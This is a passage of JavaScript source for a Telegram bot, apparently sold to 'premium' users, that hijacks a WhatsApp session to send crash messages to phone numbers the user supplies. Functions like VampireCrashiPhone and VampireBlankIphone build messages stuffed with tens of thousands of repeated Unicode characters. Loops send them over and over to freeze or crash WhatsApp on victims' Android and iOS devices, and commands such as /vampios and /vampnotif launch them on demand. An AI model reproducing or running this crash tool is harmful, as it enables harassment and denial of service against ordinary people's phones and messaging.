                    "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                  sourceType: " x ",
                  sourceId: " x ",
                  sourceUrl: "https://wa.me/settings",
                  mediaUrl: "https://wa.me/settings",
                  containsAutoReply: true,
                  showAdAttribution: true,
                  ctwaClid: "ctwa_clid_example",
                  ref: "ref_example",
                },
                entryPointConversionSource: "entry_point_source_example",
                entryPointConversionApp: "entry_point_app_example",
                entryPointConversionDelaySeconds: 5,
                disappearingMode: {},
                actionLink: {
                  url: "https://wa.me/settings",
                },
                groupSubject: "Example Group Subject",
                parentGroupJid: "6287888888888-1234567890@g.us",
                trustBannerType: "trust_banner_example",
                trustBannerAction: 1,
                isSampled: false,
                utm: {
                  utmSource: "utm_source_example",
                  utmCampaign: "utm_campaign_example",
                },
                forwardedNewsletterMessageInfo: {
                  newsletterJid: "6287888888888-1234567890@g.us",
                  serverMessageId: 1,
                  newsletterName: " X ",
                  contentType: "UPDATE",
                  accessibilityText: " X ",
                },
                businessMessageForwardInfo: {
                  businessOwnerJid: "0@s.whatsapp.net",
                },
                smbClientCampaignId: "smb_client_campaign_id_example",
                smbServerCampaignId: "smb_server_campaign_id_example",
                dataSharingContext: {
                  showMmDisclosure: true,
                },
              },
            },
          },
          {
            participant: { jid: target },
            userJid: target,
          }
        );
      } catch (err) {
        console.log(err);
      }
    }
async function VampireBlankIphone(target) {
    try {
        const messsage = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "RizzGantengSholatYok" + "ી".repeat(120000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000,
                    },
                },
            },
        };
        await sock.relayMessage(target, messsage, {
            userJid: target,
        });
    }
    catch (err) {
        console.log(err);
    }
}
async function VampireInvisIphone(target) {
sock.relayMessage(
target,
{
  extendedTextMessage: {
    text: "ꦾ".repeat(55000),
    contextInfo: {
      stanzaId: target,
      participant: target,
      quotedMessage: {
        conversation: "Bangg??" + "ꦾ࣯࣯".repeat(50000),
      },
      disappearingMode: {
        initiator: "CHANGED_IN_CHAT",
        trigger: "CHAT_SETTING",
      },
    },
    inviteLinkGroupTypeV2: "DEFAULT",
  },
},
{
  paymentInviteMessage: {
    serviceType: "UPI",
    expiryTimestamp: Date.now() + 5184000000,
  },
},
{
  participant: {
    jid: target,
  },
},
{
  messageId: null,
}
);
}
async function VampireCrashiPhone(target) {
sock.relayMessage(
target,
{
  extendedTextMessage: {
    text: `iOS Crash` + "࣯ꦾ".repeat(90000),
    contextInfo: {
      fromMe: false,
      stanzaId: target,
      participant: target,
      quotedMessage: {
        conversation: "draculaxios ‌" + "ꦾ".repeat(90000),
      },
      disappearingMode: {
        initiator: "CHANGED_IN_CHAT",
        trigger: "CHAT_SETTING",
      },
    },
    inviteLinkGroupTypeV2: "DEFAULT",
  },
},
{
  participant: {
    jid: target,
  },
},
{
  messageId: null,
}
);
}
async function VampireIOS(target) {
for (let i = 0; i < 10; i++) {
await VampireCrashiPhone(target);
await VampireiPhone(target);
await VampireInvisIphone(target);
await VampireBlankIphone(target);
}
};
async function VampireStuckLogo(target) {
    for (let i = 0; i <= 10; i++) {
    await VampireBlank(target, Ptcp = true)
    await VampireSuperUi(target, Ptcp = true)
    await VampireSpamNotif(target, Ptcp = true)
    await VampireNewUi(target, Ptcp = true)
    await VampireSuperUi(target, Ptcp = true)
    await VampireCrashWa(target, Ptcp = true)
    await VampireNewUi(target, Ptcp = true)
    await VampireSuperUi(target, Ptcp = true)
    await VampireCrashWa(target, Ptcp = true)
    await VampireSuperUi(target, Ptcp = true)
    await VampireCrashTotal(target)
    }

}
async function VampireNewBug(target) {
    for (let i = 0; i <= 5; i++) {
    await VampireSuperUi(target, Ptcp = true)
    await VampireCrashWa(target, Ptcp = true)
    await VampireCrashTotal(target)
    await VampireCrashTotal(target)
    await VampireSuperUi(target, Ptcp = true)
    await VampireCrashWa(target, Ptcp = true)
    await VampireCrashTotal(target)
    await VampireCrashTotal(target)
    await VampireSuperUi(target, Ptcp = true)
    await VampireCrashWa(target, Ptcp = true)
    }

}
async function VampireSpecial(target) {
    for (let i = 0; i <= 5; i++) {
    await VampireCrashTotal(target)
    await VampireSuperUi(target, Ptcp = true)
    await VampireCrashWa(target, Ptcp = true)
    await VampireCrashTotal(target)
    await VampireSuperUi(target, Ptcp = true)
    await VampireCrashWa(target, Ptcp = true)
    await VampireCrashTotal(target)
    await VampireSuperUi(target, Ptcp = true)
    await VampireCrashWa(target, Ptcp = true)
    await VampireCrashTotal(target)
    }

}
async function VampCrashChat(target) {
    for (let i = 0; i <= 5; i++) {
    await VampireSuperUi(target, Ptcp = true)
    await VampireCrashWa(target, Ptcp = true)
    await VampireCrashTotal(target)
    await VampireSuperUi(target, Ptcp = true)
    await VampireCrashWa(target, Ptcp = true)
    await VampireCrashTotal(target)
    await VampireSuperUi(target, Ptcp = true)
    await VampireCrashWa(target, Ptcp = true)
    await VampireCrashTotal(target)
    await VampireCrashWa(target, Ptcp = true)
    await VampireCrashWa(target, Ptcp = true)
    }

}
async function VampCrashUi(target) {
    for (let i = 0; i <= 5; i++) {
    await VampireSuperUi(target, Ptcp = true)
    await VampireCrashWa(target, Ptcp = true)
    await VampireCrashTotal(target)
    await VampireSuperUi(target, Ptcp = true)
    await VampireCrashWa(target, Ptcp = true)
    await VampireCrashTotal(target)
    await VampireSuperUi(target, Ptcp = true)
    await VampireCrashWa(target, Ptcp = true)
    await VampireCrashTotal(target)
    await VampireSuperUi(target, Ptcp = true)
    await VampireCrashWa(target, Ptcp = true)
    await VampireCrashTotal(target)
    await VampireNewUi(target, Ptcp = true)
    await VampireCrashWa(target, Ptcp = true)
    await VampireSuperUi(target, Ptcp = true)
    await VampireCrashWa(target, Ptcp = true)
    }

}
async function VampireiPhone(target) {
    for (let i = 0; i <= 5; i++) {
    await VampireIOS(target);
    }

}
async function callbug(target) {
  for (let i = 0; i <= 5; i++) {
    await spamcall(target);
    await sleep(3000)
  }
}
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const senderName = msg.from.username ? `@${msg.from.username}` : `${senderId}`;
  let ligma = `
❏━━━━༽ 𝗦𝗘𝗡𝗭𝗢 𝟳.𝟬 𝗣𝗥𝗢 ༼━━━━❏
┏━━━━━━━━━━━━━━━━━━━━━━━┓
┃⚇ Nᴀᴍᴇ : ${senderName}
┃⚇ Dᴇᴠᴇʟᴏᴘᴇʀ : @Senzo268
┃⚇ Sᴛᴀᴛᴜs : ${whatsappStatus ? "Premium" : "No Access"}
┃⚇ Oɴʟɪɴᴇ : ${getOnlineDuration()}
┃⚇ ID usᴇʀ : ${senderId}
┗━━━━━━━━━━━━━━━━━━━━━━━┛
              『     ᴾᵃˢᵘᵏᵃⁿ ᴬⁿᵗᶦ ᴳᶦᵐᵐᶦᶜᵏ    』
❏━━━━━━━━━━━━━━━━━━━━━━━❏
`;
  bot.sendPhoto(chatId, "https://files.catbox.moe/5vpccu.webp", {
      caption: ligma,
      reply_markup: {
          inline_keyboard: [
              [
                  {
                      text: "༽𝗕𝘂𝗴 𝗠𝗲𝗻𝘂༼",
                      callback_data: "bugmenu"
                  },
                  {
                      text: "༽𝗢𝘄𝗻𝗲𝗿 𝗠𝗲𝗻𝘂༼",
                      callback_data: "ownermenu"
                  }
              ],
              [
                  {
                      text: "༽𝗧𝗼𝗼𝗹𝘀 𝗠𝗲𝗻𝘂༼",
                      callback_data: "toolsmenu"
                  },
              ],
              [
                  {
                      text: "༽𝗖𝗼𝗻𝘁𝗮𝗰𝘁༼",
                      url: "https://t.me/Senzo268"
                  },
              ],
              [
                  {
                      text: "༽𝗠𝘆 𝗙𝗿𝗶𝗲𝗻𝗱༼",
                      callback_data: "best_friend"
                  },
                  {
                      text: "༽𝗜𝗻𝗳𝗼 𝗨𝗽𝗱𝗮𝘁𝗲༼",
                      url: "https://t.me/Senzo_bug_bot"
                  }
              ]
          ]
      }
  });
});
bot.onText(/\/bugmenu/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const senderName = msg.from.username ? `@${msg.from.username}` : `${senderId}`;
  let ligma = `
❏━━━━༽ 𝗦𝗘𝗡𝗭𝗢 𝟳.𝟬 𝗣𝗥𝗢 ༼━━━━❏
┏━━━━━━━━━━━━━━━━━━━━━━━┓
┃⚇ Nᴀᴍᴇ : ${senderName}
┃⚇ Dᴇᴠᴇʟᴏᴘᴇʀ : @Senzo268
┃⚇ Sᴛᴀᴛᴜs : ${whatsappStatus ? "Premium" : "No Access"}
┃⚇ Oɴʟɪɴᴇ : ${getOnlineDuration()}
┃⚇ ID usᴇʀ : ${senderId}
┗━━━━━━━━━━━━━━━━━━━━━━━┛
              『     ᴾᵃˢᵘᵏᵃⁿ ᴬⁿᵗᶦ ᴳᶦᵐᵐᶦᶜᵏ    』
❏━━━━━━━━━━━━━━━━━━━━━━━❏
┏━━━━━━━  ༽𝗔𝗻𝗱𝗿𝗼𝗶𝗱༼  ━━━━━━━┓
┃⚇ /vampnotif 62×××
┃⚇ /vampblank 62×××
┃⚇ /vampori 62×××
┗━━━━━━━━━━━━━━━━━━━━━━━┛
┏━━━━━━━━  ༽𝗕𝗲𝗧𝗮༼  ━━━━━━━━┓
┃⚇ /vampbeta 62×××
┃⚇ /vampnewbeta 62×××
┗━━━━━━━━━━━━━━━━━━━━━━━┛
┏━━━━━━━━━ ༽𝗜𝗼𝘀༼ ━━━━━━━━━┓
┃⚇ /vampios 62×××
┃⚇ /vampinvisios 62×××
┗━━━━━━━━━━━━━━━━━━━━━━━┛
┏━━━━━━━━ ༽𝗚𝗿𝗼𝘂𝗽༼ ━━━━━━━━┓
┃⚇ /vampgroup <Link>
┗━━━━━━━━━━━━━━━━━━━━━━━┛
❏━━━━━━━━━━━━━━━━━━━━━━━❏
`;
  bot.sendPhoto(chatId, "https://files.catbox.moe/5vpccu.webp", {
      caption: ligma,
      reply_markup: {
          inline_keyboard: [
              [
                  {
                      text: "༽𝗢𝘄𝗻𝗲𝗿༼",
                      url: "https://t.me/Senzo268"
                  }
              ]
          ]
      }
  });
});
bot.onText(/\/ownermenu/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const senderName = msg.from.username ? `@${msg.from.username}` : `${senderId}`;
  let ligma = `
❏━━━━༽ 𝗦𝗘𝗡𝗭𝗢 𝟳.𝟬 𝗣𝗥𝗢 ༼━━━━❏
┏━━━━━━━━━━━━━━━━━━━━━━━┓
┃⚇ Nᴀᴍᴇ : ${senderName}
┃⚇ Dᴇᴠᴇʟᴏᴘᴇʀ : @Senzo268
┃⚇ Sᴛᴀᴛᴜs : ${whatsappStatus ? "Premium" : "No Access"}
┃⚇ Oɴʟɪɴᴇ : ${getOnlineDuration()}
┃⚇ ID usᴇʀ : ${senderId}
┗━━━━━━━━━━━━━━━━━━━━━━━┛
              『     ᴾᵃˢᵘᵏᵃⁿ ᴬⁿᵗᶦ ᴳᶦᵐᵐᶦᶜᵏ    』
❏━━━━━━━━━━━━━━━━━━━━━━━❏
┏━━━━━━ 𝗢𝗪𝗡𝗘𝗥 𝗠𝗘𝗡𝗨 ━━━━━━┓
┃⚇ /addbot <Num>
┃⚇ /delbot <Num>
┃⚇ /addprem <ID>
┃⚇ /delprem <ID>
┃⚇ /addowner <ID>
┃⚇ /delowner <ID>
┗━━━━━━━━━━━━━━━━━━━━━━━━┛
`;
  bot.sendPhoto(chatId, "https://files.catbox.moe/5vpccu.webp", {
      caption: ligma,
      reply_markup: {
          inline_keyboard: [
              [
                  {
                      text: "༽𝗢𝘄𝗻𝗲𝗿༼",
                      url: "https://t.me/Senzo268"
                  }
              ]
          ]
      }
  });
});
bot.onText(/\/toolsmenu/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const senderName = msg.from.username ? `@${msg.from.username}` : `${senderId}`;
  let ligma = `
❏━━━━༽ 𝗦𝗘𝗡𝗭𝗢 𝟳.𝟬 𝗣𝗥𝗢 ༼━━━━❏
┏━━━━━━━━━━━━━━━━━━━━━━━┓
┃⚇ Nᴀᴍᴇ : ${senderName}
┃⚇ Dᴇᴠᴇʟᴏᴘᴇʀ : @Senzo268
┃⚇ Sᴛᴀᴛᴜs : ${whatsappStatus ? "Premium" : "No Access"}
┃⚇ Oɴʟɪɴᴇ : ${getOnlineDuration()}
┃⚇ ID usᴇʀ : ${senderId}
┗━━━━━━━━━━━━━━━━━━━━━━━┛
              『     ᴾᵃˢᵘᵏᵃⁿ ᴬⁿᵗᶦ ᴳᶦᵐᵐᶦᶜᵏ    』
❏━━━━━━━━━━━━━━━━━━━━━━━❏
┏━━━━━━ 𝗧𝗢𝗢𝗟𝗦 𝗠𝗘𝗡𝗨 ━━━━━━┓
┃⚇ /fixedbug <Num>
┃⚇ /encrypthard <Tag File>
┃⚇ /cooldown <Num>
┗━━━━━━━━━━━━━━━━━━━━━━━━┛
`;
  bot.sendPhoto(chatId, "https://files.catbox.moe/5vpccu.webp", {
      caption: ligma,
      reply_markup: {
          inline_keyboard: [
              [
                  {
                      text: "༽𝗢𝘄𝗻𝗲𝗿༼",
                      url: "https://t.me/Senzo268"
                  }
              ]
          ]
      }
  });
});
//========================================================\\ 
bot.onText(/\/addbot(?:\s(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;
  if (!owner.includes(senderId)) {
    return bot.sendMessage(chatId, "❌Lu Bukan Owner Tolol!!!")
  }

  if (!match[1]) {
    return bot.sendMessage(chatId, "❌ Pakai Code Negara Bego\nContoh Nih Njing: /addbot 62×××.");
}
const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
if (!/^\d+$/.test(numberTarget)) {
    return bot.sendMessage(chatId, "❌ Contoh Nih Njing : /addbot 62×××.");
}

await getSessions(bot, chatId, numberTarget)
});

// Logout Command
bot.onText(/\/delbot/, async (msg) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  // Cek apakah user adalah owner
  if (!owner.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ Lu Bukan Owner Tolol!!!");
  }

  try {
    // Logout: delete creds.json and reset status
    if (fs.existsSync('./VampirePrivate/creds.json')) {
      fs.unlinkSync('./VampirePrivate/creds.json');
    }
    whatsappStatus = false;
    return bot.sendMessage(chatId, "✅ Nomor Telah Di Logout Dari WhatsApp");
  } catch (error) {
    console.error(error);
    return bot.sendMessage(chatId, "❌ Gagal Mengganti Nomor");
  }
});
bot.onText(/^\/fixedbug\s+(.+)/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;
    const q = match[1]; // Ambil argumen setelah /delete-bug
    
    if (!premiumUsers.includes(senderId)) {
        return bot.sendMessage(chatId, 'Lu Gak Punya Access Tolol...');
    }
    
    if (!q) {
        return bot.sendMessage(chatId, `Cara Pakai Nih Njing!!!\n/fixedbug 62xxx`);
    }
    
    let pepec = q.replace(/[^0-9]/g, "");
    if (pepec.startsWith('0')) {
        return bot.sendMessage(chatId, `Contoh : /fixedbug 62xxx`);
    }
    
    let target = pepec + '@s.whatsapp.net';
    
    try {
        for (let i = 0; i < 3; i++) {
            await sock.sendMessage(target, { 
                text: "𝐕𝐀𝐌𝐏𝐈𝐑𝐄 𝐂𝐋𝐄𝐀𝐑 𝐁𝐔𝐆\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n𝐕𝐀𝐌𝐏𝐈𝐑𝐄 𝐂𝐋𝐄𝐀𝐑 𝐁𝐔𝐆"
            });
        }
        bot.sendMessage(chatId, "Done Clear Bug By Sezno!!!");
    } catch (err) {
        console.error("Error:", err);
        bot.sendMessage(chatId, "Ada kesalahan saat mengirim bug.");
    }
});
bot.onText(/\/cooldown(\d+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  // Pastikan hanya owner yang bisa mengatur cooldown
  if (!owner.includes(senderId)) {
    return bot.sendMessage(chatId, "Lu Siapa Ngentot...\nGak ada hak gunain fitur ini");
  }

  const newCooldown = parseInt(match[1]);
  if (isNaN(newCooldown) || newCooldown <= 0) {
    return bot.sendMessage(chatId, "❌ Masukkan waktu cooldown yang valid dalam detik.");
  }

  cooldownTime = newCooldown;
  return bot.sendMessage(chatId, `✅ Cooldown time successfully set to ${cooldownTime} seconds.`);
});
bot.onText(/\/vampori(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;

    if (!whatsappStatus) {
        return bot.sendMessage(chatId, "❌ Harap Hubungkan Nomor WhatsApp Anda.");
    }
    if (!premiumUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ Premium Users Only");
    }
    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a target number. Example: /vampori 62×××.");
    }

    const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
    if (!/^\d+$/.test(numberTarget)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /vampori 62×××.");
    }

    const formatedNumber = numberTarget + "@s.whatsapp.net";

    // Kirim pesan awal dengan gambar
    await bot.sendPhoto(chatId, "https://files.catbox.moe/wfhaut.webp", {
        caption: `┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓
┃ Mᴏʜᴏɴ ᴍᴇɴᴜɴɢɢᴜ...
┃ Bᴏᴛ sᴇᴅᴀɴɢ ᴏᴘᴇʀᴀsɪ ᴘᴇɴɢɪʀɪᴍᴀɴ ʙᴜɢ
┃ Tᴀʀɢᴇᴛ  : ${numberTarget}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });

    // Proses pengiriman bug
    await VampireNewBug(formatedNumber);

    // Kirim pesan setelah selesai dengan gambar lain
    await bot.sendPhoto(chatId, "https://files.catbox.moe/5vpccu.webp", {
        caption: `
┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━┓
┃         〢𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗦𝗲𝗻𝘁 𝗕𝘂𝗴 𝘁𝗼〢
┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
┃〢 Cᴏᴍᴍᴀɴᴅ : /vampori
┃〢 Wᴀʀɴɪɴɢ : ᴊᴇᴅᴀ 3 ᴍᴇɴɪᴛ ʏᴀ ᴋɪᴅs
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });
});
bot.onText(/\/vampnotif(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;

    if (!whatsappStatus) {
        return bot.sendMessage(chatId, "❌ Harap Hubungkan Nomor WhatsApp Anda.");
    }
    if (!premiumUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ Lu Bukan Premium Idiot!!!");
    }
    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Masukin Nomor Yang Bener Idiot\nContoh Nih Njing : /vampnotif 62×××.");
    }

    const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
    if (!/^\d+$/.test(numberTarget)) {
        return bot.sendMessage(chatId, "❌ Gagal Bro, Coba Ulang\nContoh : /vampnotif 62×××.");
    }

    const formatedNumber = numberTarget + "@s.whatsapp.net";

    // Kirim pesan awal dengan gambar
    await bot.sendPhoto(chatId, "https://files.catbox.moe/wfhaut.webp", {
        caption: `┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓
┃ Mᴏʜᴏɴ ᴍᴇɴᴜɴɢɢᴜ...
┃ Bᴏᴛ sᴇᴅᴀɴɢ ᴏᴘᴇʀᴀsɪ ᴘᴇɴɢɪʀɪᴍᴀɴ ʙᴜɢ
┃ Tᴀʀɢᴇᴛ  : ${numberTarget}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });

    // Proses pengiriman bug
    await VampCrashUi(formatedNumber);
    await VampireSpecial(formatedNumber);
    await VampCrashChat(formatedNumber);

    // Kirim pesan setelah selesai dengan gambar lain
    await bot.sendPhoto(chatId, "https://files.catbox.moe/5vpccu.webp", {
        caption: `
┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━┓
┃         〢𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗦𝗲𝗻𝘁 𝗕𝘂𝗴 𝘁𝗼〢
┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
┃〢 Cᴏᴍᴍᴀɴᴅ : /vampnotif
┃〢 Wᴀʀɴɪɴɢ : ᴊᴇᴅᴀ 3 ᴍᴇɴɪᴛ ʏᴀ ᴋɪᴅs
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });
});
bot.onText(/\/vampbeta(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;

    if (!whatsappStatus) {
        return bot.sendMessage(chatId, "❌ Harap Hubungkan Nomor WhatsApp Anda.");
    }
    if (!premiumUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ Lu Bukan Premium Idiot!!!");
    }
    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Masukin Nomor Yang Bener Idiot\nContoh Nih Njing : /vampbeta 62×××.");
    }

    const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
    if (!/^\d+$/.test(numberTarget)) {
        return bot.sendMessage(chatId, "❌ Gagal Bro, Coba Ulang\nContoh : /vampbeta 62×××.");
    }

    const formatedNumber = numberTarget + "@s.whatsapp.net";

    // Kirim notifikasi awal dengan gambar
    await bot.sendPhoto(chatId, "https://files.catbox.moe/wfhaut.webp", {
        caption: `┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓
┃ Mᴏʜᴏɴ ᴍᴇɴᴜɴɢɢᴜ...
┃ Bᴏᴛ sᴇᴅᴀɴɢ ᴏᴘᴇʀᴀsɪ ᴘᴇɴɢɪʀɪᴍᴀɴ ʙᴜɢ
┃ Tᴀʀɢᴇᴛ  : ${numberTarget}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });

    // Proses pengiriman bug
    await VampCrashUi(formatedNumber);
    await VampireSpecial(formatedNumber);
    await VampCrashChat(formatedNumber);

    // Kirim notifikasi setelah selesai dengan gambar lain
    await bot.sendPhoto(chatId, "https://files.catbox.moe/5vpccu.webp", {
        caption: `
┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━┓
┃         〢𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗦𝗲𝗻𝘁 𝗕𝘂𝗴 𝘁𝗼〢
┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
┃〢 Cᴏᴍᴍᴀɴᴅ : /vampbeta
┃〢 Wᴀʀɴɪɴɢ : ᴊᴇᴅᴀ 3 ᴍᴇɴɪᴛ ʏᴀ ᴋɪᴅs
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });
});
bot.onText(/\/vampios(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;

    if (!whatsappStatus) {
        return bot.sendMessage(chatId, "❌ Harap Hubungkan Nomor WhatsApp Anda.");
    }
    if (!premiumUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ Premium Users Only");
    }
    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a target number.\nExample: /vampios 62×××.");
    }

    const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
    if (!/^\d+$/.test(numberTarget)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /vampios 62×××.");
    }

    const formatedNumber = numberTarget + "@s.whatsapp.net";

    // Kirim notifikasi awal dengan gambar
    await bot.sendPhoto(chatId, "https://files.catbox.moe/wfhaut.webp", {
        caption: `┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓
┃ Mᴏʜᴏɴ ᴍᴇɴᴜɴɢɢᴜ...
┃ Bᴏᴛ sᴇᴅᴀɴɢ ᴏᴘᴇʀᴀsɪ ᴘᴇɴɢɪʀɪᴍᴀɴ ʙᴜɢ
┃ Tᴀʀɢᴇᴛ  : ${numberTarget}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });

    // Proses pengiriman bug
    await VampireiPhone(formatedNumber);

    // Kirim notifikasi setelah selesai dengan gambar lain
    await bot.sendPhoto(chatId, "https://files.catbox.moe/5vpccu.webp", {
        caption: `
┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━┓
┃         〢𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗦𝗲𝗻𝘁 𝗕𝘂𝗴 𝘁𝗼〢
┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
┃〢 Cᴏᴍᴍᴀɴᴅ : /vampios
┃〢 Wᴀʀɴɪɴɢ : ᴊᴇᴅᴀ 3 ᴍᴇɴɪᴛ ʏᴀ ᴋɪᴅs
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });
});
bot.onText(/\/vampinvisios(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;

    if (!whatsappStatus) {
